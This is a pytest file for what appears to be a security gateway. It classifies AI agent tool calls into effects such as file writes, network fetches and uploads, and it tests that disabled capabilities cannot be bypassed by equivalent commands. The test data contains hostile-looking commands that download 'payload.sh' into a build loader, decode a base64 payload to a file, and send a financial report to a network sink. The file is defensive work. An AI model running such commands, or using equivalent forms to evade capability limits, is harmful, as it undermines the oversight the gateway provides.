from __future__ import annotations

import json

import pytest

from clawsentry.gateway.effect_normalizer import normalize_action_effect
from clawsentry.gateway.models import (
    CanonicalEvent,
    ContentEvidenceEnvelope,
    ContentEvidenceItem,
    DecisionContext,
    EventType,
    SessionScopeBaseRules,
    SessionScopeProfile,
)


def _event(
    *,
    tool_name: str,
    payload: dict,
    event_id: str = "evt-effect",
) -> CanonicalEvent:
    return CanonicalEvent(
        event_id=event_id,
        trace_id=f"trace-{event_id}",
        event_type=EventType.PRE_ACTION,
        session_id="sess-effect",
        agent_id="agent-effect",
        source_framework="test",
        occurred_at="2026-05-16T00:00:00+00:00",
        payload=payload,
        tool_name=tool_name,
    )


def _disabled_context(*capabilities: str) -> DecisionContext:
    return DecisionContext(
        session_scope_profile=SessionScopeProfile(
            profile_id="scope-disabled-capabilities",
            confirmed=True,
            dry_run=False,
            base_rules=SessionScopeBaseRules(
                denied_capabilities=list(capabilities),
            ),
        )
    )


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_rule"),
    [
        ("Write", {"path": "build/loader.sh", "content": "#!/bin/sh\necho x"}, "native_write_effect"),
        ("bash", {"command": "printf '%s' x > build/loader.sh"}, "shell_redirection_write"),
        ("bash", {"command": "cat > build/loader.sh <<'EOF'\nx\nEOF"}, "shell_heredoc_write"),
        ("bash", {"command": "printf x | tee build/loader.sh"}, "shell_tee_write"),
        ("bash", {"command": "tee <<EOF build/loader.sh\nx\nEOF"}, "shell_tee_write"),
        ("bash", {"command": "base64 -d payload.b64 > build/loader.sh"}, "decode_to_file_write"),
        ("bash", {"command": "dd if=/tmp/payload of=build/loader.sh"}, "dd_output_write"),
        ("python", {"command": "python -c \"open('build/loader.sh', 'w').write('x')\""}, "python_file_write"),
        ("node", {"command": "node -e \"require('fs').writeFileSync('build/loader.sh', 'x')\""}, "node_file_write"),
        ("powershell", {"command": "Set-Content -Path build/loader.ps1 -Value x"}, "powershell_file_write"),
        ("powershell", {"command": "Set-Content -Path \"build/loader.ps1\" -Value x"}, "powershell_file_write"),
        ("powershell", {"command": "Set-Content -Path \"build/loader script.ps1\" -Value x"}, "powershell_file_write"),
        ("Agent", {"prompt": "Create build/loader.sh with the payload from earlier."}, "delegated_write_request"),
        ("bash", {"command": "curl https://example.test/payload.sh -o build/loader.sh"}, "network_download_write"),
        ("bash", {"command": "wget https://example.test/payload.sh -O build/loader.sh"}, "network_download_write"),
        ("bash", {"command": "scp host:/tmp/payload build/loader.sh"}, "network_download_write"),
    ],
)
def test_filesystem_write_equivalents_have_common_effect_and_redacted_targets(
    tool_name,
    payload,
    expected_rule,
):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert "filesystem.write" in envelope.effects
    assert expected_rule in envelope.evidence_rules
    assert envelope.confidence in {"medium", "high"}
    assert envelope.targets
    assert envelope.targets[0].path_hash.startswith("sha256:")

    summary = envelope.to_summary()
    serialized = json.dumps(summary, sort_keys=True)
    assert "build/loader.sh" not in serialized
    assert "build/loader.ps1" not in serialized
    assert "build/loader script.ps1" not in serialized
    assert payload.get("command", payload.get("content", payload.get("prompt", ""))) not in serialized


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_rule"),
    [
        ("bash", {"command": "curl https://example.test/payload.sh -o payload.sh"}, "network_equivalent_fetch"),
        ("python", {"command": "python -c \"import requests; requests.get('https://example.test')\""}, "python_network_fetch"),
        ("node", {"command": "node -e \"fetch('https://example.test')\""}, "node_network_fetch"),
    ],
)
def test_network_fetch_equivalents_share_network_effect(tool_name, payload, expected_rule):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert "network.fetch" in envelope.effects
    assert expected_rule in envelope.evidence_rules


def test_network_download_to_file_matches_disabled_filesystem_write():
    envelope = normalize_action_effect(
        _event(
            tool_name="bash",
            payload={"command": "curl https://example.test/payload.sh -o build/loader.sh"},
        ),
        context=_disabled_context("filesystem.write"),
    )

    assert "filesystem.write" in envelope.effects
    assert "network.fetch" in envelope.effects
    assert "network_download_write" in envelope.evidence_rules
    assert "disabled_capability_equivalent" in envelope.evidence_rules
    assert envelope.disabled_capabilities == ["filesystem.write"]


def test_disabled_capability_context_marks_equivalent_effect():
    event = _event(
        tool_name="bash",
        payload={"command": "printf '%s' x > build/loader.sh"},
    )
    envelope = normalize_action_effect(
        event,
        context=_disabled_context("filesystem.write"),
    )

    assert "disabled_capability_equivalent" in envelope.evidence_rules
    assert envelope.disabled_capabilities == ["filesystem.write"]


def test_unsupported_semantic_wrapper_is_explicit_not_silent_allow():
    event = _event(
        tool_name="bash",
        payload={"command": "bash <(cat build/generated.sh)"},
    )
    envelope = normalize_action_effect(event, context=_disabled_context("command.exec"))

    assert envelope.analysis_state == "unsupported"
    assert "wrapper_chain_unresolved" in envelope.evidence_rules


def test_content_evidence_upload_adds_network_upload_effect():
    context = DecisionContext(
        content_evidence=ContentEvidenceEnvelope(
            items=[
                ContentEvidenceItem(
                    canonical_evidence_id="ce_001",
                    kind="skill_script",
                    source="gateway_resolved_path",
                    path_trust="gateway_resolved_workspace",
                    resolver_status="resolved_static_local_path",
                    derived_rules=[
                        {"rule_id": "associated_script_network_sink", "severity": "high"},
                        {"rule_id": "document_input_to_network_sink", "severity": "high"},
                    ],
                )
            ]
        )
    )

    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "python file_backup.py Q4_financial_report.pptx"}),
        context=context,
    )
    summary = envelope.to_summary()

    assert "network.upload" in summary["effects"]
    assert "associated_script_network_sink" in summary["evidence_rules"]
    assert "document_input_to_network_sink" in summary["evidence_rules"]
    assert {target["path_role"] for target in summary["targets"]} >= {"executed_script", "document_input"}
